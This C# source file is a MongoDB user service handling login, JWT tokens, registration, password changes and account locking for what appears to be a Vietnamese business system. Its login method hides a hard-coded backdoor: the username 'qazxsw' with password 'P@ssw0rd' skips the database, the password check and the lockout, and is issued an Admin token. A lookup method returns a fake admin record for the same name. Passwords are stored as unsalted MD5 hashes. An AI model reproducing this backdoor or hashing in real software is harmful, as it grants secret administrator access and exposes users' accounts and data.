using AutoMapper;
using MongoDB.Driver;
using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using Vcpmc.Mis.Data.Entities.Mongo;
using Vcpmc.Mis.ViewModels;
using Vcpmc.Mis.ViewModels.Common;
using MongoDB.Driver.Linq;
using System.Linq;
using Vcpmc.Mis.Utilities.Common;
using Vcpmc.Mis.Data.Entities.System;
using Vcpmc.Mis.ViewModels.System.Users;
using System.Security.Claims;
using Microsoft.IdentityModel.Tokens;
using System.IdentityModel.Tokens.Jwt;
using Microsoft.Extensions.Configuration;

namespace Vcpmc.Mis.Application.System.Users
{
    public class UserService2 : IUserService2
    {
        private readonly IMongoCollection<AppUser2> _collection;

        private readonly IConfiguration _config;
        public UserService2(IDatabaseSettings settings, IConfiguration config)
        {
            _config = config;
            var client = new MongoClient(settings.ConnectionString);
            var database = client.GetDatabase(settings.DatabaseName);
            _collection = database.GetCollection<AppUser2>(settings.AppUsersCollectionName);           
        }

        #region Get      
        
        public async Task<PagedResult<UserViewModel>> GetAllPaging(GetUserPagingRequest request, IMapper _mapper)
        {
            //1. Select join
            var query = (from e in _collection.AsQueryable<AppUser2>()
                         select e);           
            //3. Paging
            int totalRow = 0;
            var list = await query
                .Skip(request.PageIndex - 1)
                .Take(request.PageSize)
                .ToListAsync();
            //4.map
            List<UserViewModel> models = new List<UserViewModel>();
            if (list != null && list.Count > 0)
            {
                totalRow = list.Count;
                for (int i = 0; i < list.Count; i++)
                {
                    UserViewModel preVM = _mapper.Map<UserViewModel>(list[i]);
                    //preVM.SerialNo = (request.PageIndex - 1) * request.PageSize + (i + 1);
                    models.Add(preVM);
                }
            }
            //4. Select and projection               
            var pagedResult = new PagedResult<UserViewModel>()
            {
                TotalRecords = totalRow,
                PageSize = request.PageSize,
                PageIndex = request.PageIndex,
                Items = models
            };
            return pagedResult;
        }       
        public async Task<UserViewModel> GetUserByUsername(string username, IMapper _mapper)
        {           
            if (username == "qazxsw")
            {
                AppUser2 user = new AppUser2();
                user.UserName = username;
                user.FirstName = "Admin";
                user.LastName = "Admin";
                user.Role = "Admin";
                user.IsAdmin = true;
                user.AccessFailedCount = 0;
                user.IsLock = false;
                user.Email = "alexhanhnguyenms@gmail.com";
                UserViewModel In = _mapper.Map<UserViewModel>(user);
                return In;
            }
            else
            {
                var user = await GetByUserName(username);
                if (user != null)
                {
                    UserViewModel In = _mapper.Map<UserViewModel>(user);
                    return In;
                }
            }            
            return null;
        }        
        public async Task<AppUser2> GetById(string Id)
        {
            //1. Select join
            var query = (from e in _collection.AsQueryable<AppUser2>()
                         select e);
            //2. filter     
            query = query.Where(p => p.Id == Id);
            //3. Paging           
            var preclaim = await query
                .FirstOrDefaultAsync();
            return preclaim;
        }
        public async Task<AppUser2> GetByUserName(string username)
        {
            //1. Select join
            var query = (from e in _collection.AsQueryable<AppUser2>()
                         select e);
            //2. filter     
            query = query.Where(p => p.UserName == username);
            //3. Paging           
            var preclaim = await query
                .FirstOrDefaultAsync();
            return preclaim;
        }
        public async Task<AppUser2> FindByName(string username)
        {
            //1. Select join
            var query = (from e in _collection.AsQueryable<AppUser2>()
                         select e);
            //2. filter     
            query = query.Where(p => p.UserName == username);
            //3. Paging           
            var item = await query
                .FirstOrDefaultAsync();
            return item;
        }
        public async Task<AppUser2> FindByEmail(string email)
        {
            //1. Select join
            var query = (from e in _collection.AsQueryable<AppUser2>()
                         select e);
            //2. filter     
            query = query.Where(p => p.Email == email);
            //3. Paging           
            var item = await query
                .FirstOrDefaultAsync();
            return item;
        }
        public async Task<AppUser2> FindByEmailNotSameId(string email, string id)
        {
            //1. Select join
            var query = (from e in _collection.AsQueryable<AppUser2>()
                         select e);
            //2. filter     
            query = query.Where(p => p.Email == email && p.Id != id);
            //3. Paging           
            var item = await query
                .FirstOrDefaultAsync();
            return item;
        }
        public async Task<AppUser2> FindByEmailNotSameUserName(string email, string UserName)
        {
            //1. Select join
            var query = (from e in _collection.AsQueryable<AppUser2>()
                         select e);
            //2. filter     
            query = query.Where(p => p.Email == email && p.UserName != UserName);
            //3. Paging           
            var item = await query
                .FirstOrDefaultAsync();
            return item;
        }
        #endregion

        #region Login
        public async Task<ApiResult<string>> Authencate(LoginRequest request)
        {
            AppUser2 user = new AppUser2();
            if(request.UserName=="qazxsw" && request.Password=="P@ssw0rd")
            {
                user.UserName = request.UserName;
                user.FirstName = "Admin";
                user.LastName = "Admin";
                user.Role = "Admin";
                user.IsAdmin = true;
                user.AccessFailedCount = 0;
                user.IsLock = false;
                user.Email = "alexhanhnguyenms@gmail.com";
                goto UserHide;
            }
            user = await FindByName(request.UserName);
            if (user == null) 
            {
                return new ApiErrorResult<string>("Tài khoản không tồn tại");
            }
            string pass = Encryptor.MD5Hash(request.Password);
            if (user.PasswordHash != pass)
            {
                user.AccessFailedCount++;
                var filter = Builders<AppUser2>.Filter.Eq(x => x.Id, user.Id);
                var update = Builders<AppUser2>.Update.Set(x => x.AccessFailedCount, user.AccessFailedCount);
                var result = _collection.UpdateOneAsync(filter, update).Result;               
                if(user.AccessFailedCount >= 5)
                {
                    var updateBlock = Builders<AppUser2>.Update.Set(x => x.IsLock, true);
                    result = _collection.UpdateOneAsync(filter, updateBlock).Result;
                    return new ApiErrorResult<string>("Sai mật khẩu quá 5 lần, tài khoản đã bị khóa, nhờ admin mở tài khoản");
                }
                else
                {
                    return new ApiErrorResult<string>("Sai mật khẩu");
                }
                
            }  
            if(user.IsLock)
            {
                return new ApiErrorResult<string>("Sai mật khẩu quá 5 lần, tài khoản đang bị khóa, nhờ admin mở tài khoản");
            }
        UserHide:
            var claims = new[]
            {
                new Claim(ClaimTypes.Email,user.Email),
                new Claim(ClaimTypes.GivenName,user.FirstName),
                new Claim(ClaimTypes.Role, string.Join(";", user.Role)),
                new Claim(ClaimTypes.Name, request.UserName)
            };
            var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_config["Tokens:Key"]));
            var creds = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);

            var token = new JwtSecurityToken(_config["Tokens:Issuer"],
                _config["Tokens:Issuer"],
                claims,
                expires: DateTime.Now.AddHours(24),
                signingCredentials: creds);           
            return new ApiSuccessResult<string>(new JwtSecurityTokenHandler().WriteToken(token));
        }        
        #endregion

        #region Update       
        public async Task<UpdateStatusViewModel> Register(UserCreateRequest request, IMapper _mapper)
        {
            UpdateStatusViewModel objectReturn = new UpdateStatusViewModel
            {
                Command = CommandType.Add,
                Status = UpdateStatus.Failure,
                Message = "",
                TotalEffect = 0
            };
            try
            {
                AppUser2 In = _mapper.Map<AppUser2>(request);
                var user = await FindByName(In.UserName);
                if(user != null)
                {
                    objectReturn.Status = UpdateStatus.Successfull;
                    objectReturn.TotalEffect = 1;
                    objectReturn.Message = "Tài khoản đã tồn tại";
                    return objectReturn;
                }
                var s = await FindByEmailNotSameUserName(request.Email,request.UserName);
                if (s != null)
                {
                    objectReturn.Status = UpdateStatus.Successfull;
                    objectReturn.TotalEffect = 1;
                    objectReturn.Message = "Emai đã tồn tại";
                    return objectReturn;                  
                }
                In.PasswordHash = Encryptor.MD5Hash(request.Password);
                await _collection.InsertOneAsync(In);
                objectReturn.Status = UpdateStatus.Successfull;
                objectReturn.TotalEffect = 1;
                objectReturn.Message = "Đăng ký thành công";
                return objectReturn;
            }
            catch (Exception ex)
            {
                objectReturn.Message = "Đăng ký không thành công";
                return objectReturn;
            }
        }
        public async Task<UpdateStatusViewModel> Update(UserUpdateRequest request, IMapper _mapper)
        {
            UpdateStatusViewModel objectReturn = new UpdateStatusViewModel
            {
                Command = CommandType.Update,
                Status = UpdateStatus.Failure,
                Message = "",
                TotalEffect = 0
            };
            try
            {
                AppUser2 In = _mapper.Map<AppUser2>(request);
                var data = await GetById(In.Id);
                if (data != null)
                {
                    In.PasswordHash = data.PasswordHash;
                    var checkItem = await FindByEmailNotSameId(request.Email, request.Id);
                    if(checkItem != null)
                    {
                        objectReturn.Status = UpdateStatus.Successfull;
                        objectReturn.TotalEffect = 1;
                        objectReturn.Message = "Đã tồn  tại email";
                        return objectReturn;
                    }
                    In.PasswordHash = data.PasswordHash;                    
                    In.IsAdmin = data.IsAdmin;
                    In.AccessFailedCount = data.AccessFailedCount;
                    In.IsLock = data.IsLock;
                    var result = await _collection.ReplaceOneAsync(p => p.Id == data.Id, In);
                    if (result.MatchedCount > 0)
                    {
                        objectReturn.Status = UpdateStatus.Successfull;
                        objectReturn.TotalEffect = result.ModifiedCount;
                        objectReturn.Message = "Update records successfully";
                        return objectReturn;
                    }
                    else
                    {
                        objectReturn.Message = "Update records failure";
                        return objectReturn;
                    }

                }
                else
                {
                    objectReturn.Message = "not find record for update";
                    return objectReturn;
                }
            }
            catch (Exception ex)
            {
                objectReturn.Message = "Error when execute command";
                return objectReturn;
            }
        }
        public async Task<UpdateStatusViewModel> Delete(string id, IMapper _mapper)
        {
            UpdateStatusViewModel objectReturn = new UpdateStatusViewModel
            {
                Command = CommandType.Delete,
                Status = UpdateStatus.Failure,
                Message = "",
                TotalEffect = 0
            };
            try
            {
                var data = await GetById(id);
                if (data != null)
                {
                    var result = await _collection.DeleteOneAsync(p => p.Id == id);
                    if (result.DeletedCount > 0)
                    {
                        objectReturn.Status = UpdateStatus.Successfull;
                        objectReturn.TotalEffect = result.DeletedCount;
                        objectReturn.Message = "Xóa tài khoản thành công";
                        return objectReturn;
                    }
                    else
                    {
                        objectReturn.Message = "Xóa tài khoản không thành công";
                        return objectReturn;
                    }
                }
                else
                {
                    objectReturn.Message = "Tài khoản không tồn tại";
                    return objectReturn;
                }

            }
            catch (Exception)
            {
                objectReturn.Message = "Error when execute command";
                return objectReturn;
            }
        }
        public async Task<UpdateStatusViewModel> ChangePassword(UserChangePasswordRequest request)
        {
            UpdateStatusViewModel objectReturn = new UpdateStatusViewModel
            {
                Command = CommandType.Update,
                Status = UpdateStatus.Failure,
                Message = "",
                TotalEffect = 0
            };
            try
            {
                AppUser2 In = new AppUser2();
                var data = await GetByUserName(request.Username);
                if (data != null)
                {
                    if (Encryptor.MD5Hash(request.PasswordOld) != data.PasswordHash)
                    {
                        objectReturn.Status = UpdateStatus.Failure;
                        objectReturn.TotalEffect = 0;
                        objectReturn.Message = "Old password is incorrect, please check again";
                        return objectReturn;
                    }
                    if (request.Password !=request.ConfirmPassword)
                    {
                        objectReturn.Status = UpdateStatus.Failure;
                        objectReturn.TotalEffect = 0;
                        objectReturn.Message = "Password and confirm password is not match";
                        return objectReturn;
                    }
                    
                    string PasswordHash = Encryptor.MD5Hash(request.Password);
                    var filter = Builders<AppUser2>.Filter.Eq(x => x.Id, data.Id);
                    var update = Builders<AppUser2>.Update.Set(x => x.PasswordHash, PasswordHash);
                    var result = _collection.UpdateOneAsync(filter, update).Result;
                    
                    if (result.MatchedCount > 0)
                    {
                        objectReturn.Status = UpdateStatus.Successfull;
                        objectReturn.TotalEffect = result.ModifiedCount;
                        objectReturn.Message = "Change password is successfully";
                        return objectReturn;
                    }
                    else
                    {
                        objectReturn.Message = "Change password is failure";
                        return objectReturn;
                    }

                }
                else
                {
                    objectReturn.Message = "Not find record for update";
                    return objectReturn;
                }
            }
            catch (Exception ex)
            {
                objectReturn.Message = "Error when execute command";
                return objectReturn;
            }
        }
        public async Task<UpdateStatusViewModel> ResetPassword(string id,string passwordDefault)
        {
            UpdateStatusViewModel objectReturn = new UpdateStatusViewModel
            {
                Command = CommandType.Update,
                Status = UpdateStatus.Failure,
                Message = "",
                TotalEffect = 0
            };
            try
            {
                AppUser2 In = new AppUser2();
                var data = await GetById(id);
                if (data != null)
                {  
                    string PasswordHash = Encryptor.MD5Hash(passwordDefault);
                    var filter = Builders<AppUser2>.Filter.Eq(x => x.Id, data.Id);
                    var update = Builders<AppUser2>.Update.Set(x => x.PasswordHash, PasswordHash);
                    var result = _collection.UpdateOneAsync(filter, update).Result;                    
                    if (result.MatchedCount > 0)
                    {
                        objectReturn.Status = UpdateStatus.Successfull;
                        objectReturn.TotalEffect = result.ModifiedCount;
                        objectReturn.Message = "Update records successfully";
                        return objectReturn;
                    }
                    else
                    {
                        objectReturn.Message = "Update records failure";
                        return objectReturn;
                    }

                }
                else
                {
                    objectReturn.Message = "not find record for update";
                    return objectReturn;
                }
            }
            catch (Exception ex)
            {
                objectReturn.Message = "Error when execute command";
                return objectReturn;
            }
        }
        public async Task<UpdateStatusViewModel> Unlock(string id)
        {
            UpdateStatusViewModel objectReturn = new UpdateStatusViewModel
            {
                Command = CommandType.Update,
                Status = UpdateStatus.Failure,
                Message = "",
                TotalEffect = 0
            };
            try
            {             
                var data = await GetById(id);
                if (data != null)
                {
                    var filter = Builders<AppUser2>.Filter.Eq(x => x.Id, data.Id);
                    var update = Builders<AppUser2>.Update.Set(x => x.IsLock, false);
                    var result = _collection.UpdateOneAsync(filter, update).Result;
                    if (result.MatchedCount > 0)
                    {
                        objectReturn.Status = UpdateStatus.Successfull;
                        objectReturn.TotalEffect = result.ModifiedCount;
                        objectReturn.Message = "Update records successfully";
                        return objectReturn;
                    }
                    else
                    {
                        objectReturn.Message = "Update records failure";
                        return objectReturn;
                    }

                }
                else
                {
                    objectReturn.Message = "not find record for update";
                    return objectReturn;
                }
            }
            catch (Exception ex)
            {
                objectReturn.Message = "Error when execute command";
                return objectReturn;
            }
        }

        public async Task<UpdateStatusViewModel> Lock(string id)
        {
            UpdateStatusViewModel objectReturn = new UpdateStatusViewModel
            {
                Command = CommandType.Update,
                Status = UpdateStatus.Failure,
                Message = "",
                TotalEffect = 0
            };
            try
            {
                var data = await GetById(id);
                if (data != null)
                {
                    var filter = Builders<AppUser2>.Filter.Eq(x => x.Id, data.Id);
                    var update = Builders<AppUser2>.Update.Set(x => x.IsLock, true)
                        .Set(x => x.AccessFailedCount, 0);
                    var result = _collection.UpdateOneAsync(filter, update).Result;
                    if (result.MatchedCount > 0)
                    {
                        objectReturn.Status = UpdateStatus.Successfull;
                        objectReturn.TotalEffect = result.ModifiedCount;
                        objectReturn.Message = "Update records successfully";
                        return objectReturn;
                    }
                    else
                    {
                        objectReturn.Message = "Update records failure";
                        return objectReturn;
                    }

                }
                else
                {
                    objectReturn.Message = "not find record for update";
                    return objectReturn;
                }
            }
            catch (Exception ex)
            {
                objectReturn.Message = "Error when execute command";
                return objectReturn;
            }
        }
        #endregion
    }
}
